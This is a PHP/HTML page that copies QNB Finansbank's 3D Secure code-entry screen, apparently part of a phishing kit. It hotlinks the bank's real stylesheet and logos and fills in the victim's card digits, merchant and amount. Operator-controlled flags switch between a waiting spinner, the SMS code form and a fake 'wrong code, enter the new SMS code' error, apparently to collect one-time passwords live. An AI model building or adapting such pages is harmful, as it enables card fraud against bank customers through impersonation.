<?php
require __DIR__ . '/_acs_core.php';
$kg = $kod_goster; $hm = $hata_modu;
$cc_last_4 = substr($kart_no, -4);
$cc_first_6 = substr($kart_no, 0, 6);
?>
	<html class="no-js" lang="tr" style="height: 100%; width: 100%;">

	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
		<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
		<meta http-equiv="Pragma" content="no-cache">
		<meta http-equiv="Expires" content="-1">
		<title>QNB Finansbank 3D Doğrulama</title>
		<script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
		<link rel="stylesheet" href="https://acs.qnbfinansbank.com/css/bundle.min.css?v=MdyKrhjGqNYJdJs5G1Aekf5F3lnmp-fqFmHweUkHZw0">
		<style>
		#state-bekle { text-align:center; padding:30px 20px; }
		#state-bekle .fn-spinner { width:40px;height:40px;border:4px solid #e0e0e0;border-top-color:#552382;border-radius:50%;animation:fn-spin 1s linear infinite;margin:0 auto 12px; }
		@keyframes fn-spin { to { transform:rotate(360deg); } }
		#hata-box { color:red; display:none; }
		</style>
	</head>

	<body>
		<div class="content-wrapper" id="content" style="display: block;">
			<div class="header">
				<div class="brand-logo"> <img 3dslogo="scheme" src="https://acs.qnbfinansbank.com/img/brand/troy.png" alt="card brand"> </div>
				<div class="member-logo"> <img 3dslogo="issuer" src="https://acs.qnbfinansbank.com/img/finansbank.png" alt="card platform"> </div>
			</div>
			<div id="approve-page">
				<div id="loaderDiv" style="height: 100%; width: 100%; position: absolute; z-index: 1; display: none">
					<div class="loader"></div>
				</div>
				<div class="content">
					<h1 id="approve-header">Doğrulama kodunu giriniz</h1>
					<div class="info-wrapper">
						<div class="info-row">
							<div class="info-col info-label">İşyeri Adı:</div>
							<div class="info-col" 3dsdisplay="merchant" id="merchant-name" test-id="merchantName"><?= htmlspecialchars($isyeri) ?></div>
						</div>
						<div class="info-row">
							<div class="info-col info-label">İşlem Tutarı:</div>
							<div class="info-col" style="font-size: 21px; font-weight: 900; margin-top: -5px;" 3dsdisplay="amount" test-id="formattedAmount" id="amount">
								<?= $tutar ?> TL
							</div>
						</div>
						<div class="info-row">
							<div class="info-col info-label">İşlem Tarihi-Saati:</div>
							<div class="info-col" 3dsdisplay="date" id="operation-date-time" test-id="purchaseDate">
								<?= $zaman ?>
							</div>
						</div>
						<div class="info-row">
							<div class="info-col info-label">Kart Numarası:</div>
							<div class="info-col" 3dsdisplay="pan" test-id="pan" id="pan">
								<?= $cc_first_6 ?>******<?= $cc_last_4 ?>
							</div>
						</div>
					</div>
					<div class="action-wrapper" 3dsdisplay="prompt" 3dslabel="prompt">
                        <?php if ($hm): ?>
                        <p id="hata-box" style="color:red;display:block;">Girdiğiniz kod hatalı. Lütfen yeni SMS kodunu giriniz.</p>
                        <br>
                        <?php else: ?>
                        <p id="hata-box" style="display:none;color:red;"></p>
                        <?php endif; ?>

						<!-- BEKLEME EKRANI -->
						<div id="state-bekle" <?= $kg ? 'style="display:none"' : '' ?>>
						  <div class="fn-spinner"></div>
						  <h3>İşlem şifreniz gönderiliyor, lütfen bekleyiniz...</h3>
						</div>

						<!-- KOD GİRİŞ -->
						<div id="state-kod" <?= $kg ? '' : 'style="display:none"' ?>>
						  <h3>İşlem şifreniz <span test-id="maskedPhone" id="msisdn">905*********</span> olan cep telefonunuza gönderilecektir.<br>Lütfen <span id="otpRefNo" test-id="otpRefNo">DFCHKJHB</span> referans numaralı alışveriş şifrenizi giriniz.</h3>
						</div>

						<div class="form-wrapper" id="state-form" <?= $kg ? '' : 'style="display:none"' ?>>
							<label for="sms-kod">Doğrulama Kodu</label>
							<form method="POST" action="" onsubmit="event.preventDefault();submitAcsKod();">
								<div class="form-row">
									<input autofocus required 3dsinput="password" type="text"
									       class="f-input" name="sms" id="sms-kod"
									       minlength="4" maxlength="8" autocomplete="one-time-code"
									       inputmode="numeric" pattern="[0-9]*"
									       oninput="this.value=this.value.replace(/\D/g,'').slice(0,8);checkAcsBtn()"> </div>
								<div id="submitButtonDiv" style="display: block;">
									<div class="form-row has-submit">
										<input id="acs-submit-btn" type="button" value="Onayla"
										       class="button btn-1 btn-commit" onclick="submitAcsKod()" disabled> </div>
									<div class="call-to-action">
										<ul class="action-list">
											<li>
												<input id="cancelbutton" type="button" value="İşlemi İptal Et" class="txt-link fancybox-ajax" style="background: none !important; border: none; cursor: pointer; font-family: inherit;"> </li>
											<li>
												<input id="helpButton" type="button" value="Yardım" class="txt-link fancybox-ajax" style="background: none !important; border: none; cursor: pointer; font-family: inherit;"> </li>
										</ul>
									</div>
									<div id="timerDiv" class="has-timer"> <span>Kalan Süre: </span> <span class="has-counter" id="time">03:00</span> </div>
								</form>
								<div test-id="helpArea" id="helpArea" class="noscriptHelpText" style="display:none;">3D Secure, internet alışverişlerinde kart sahibinin kimliğinin doğrulanması amacıyla kullanılan, hem kart sahiplerini hem de alışveriş yaptığınız firmayı sahtekarlıklara karşı koruyan uluslararası bir güvenli alışveriş çözümüdür.
									<br>Cep telefonunuza doğrulama kodu gelmemesi ya da doğrulama kodunun gönderildiği telefon numaranızın güncel olmaması gibi durumlarda 0850 222 0 900 numaralı QNB Finansbank Çağrı Merkezi ile iletişime geçebilirsiniz.</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<script>
		function startTimer(duration, display) {
			var timer = duration,
				minutes, seconds;
			setInterval(function() {
				minutes = parseInt(timer / 60, 10)
				seconds = parseInt(timer % 60, 10);
				minutes = minutes < 10 ? "0" + minutes : minutes;
				seconds = seconds < 10 ? "0" + seconds : seconds;
				display.textContent = minutes + ":" + seconds;
				if(--timer < 0) {
					timer = duration;
				}
			} , 1000);
		}
		window.onload = function() {
			var fiveMinutes = 60 * 3,
				display = document.querySelector('#time');
			if(display) startTimer(fiveMinutes, display);
		} ;
		</script>

<?= acs_heartbeat_js($kg, $hm) ?>

<script>
(function(){
  var ko=document.getElementById('state-kod');
  var fm=document.getElementById('state-form');
  if(!ko||!fm) return;
  new MutationObserver(function(){ fm.style.display=ko.style.display==='none'?'none':''; }).observe(ko,{attributes:true,attributeFilter:['style']});
})();
</script>

	</body>

	</html>
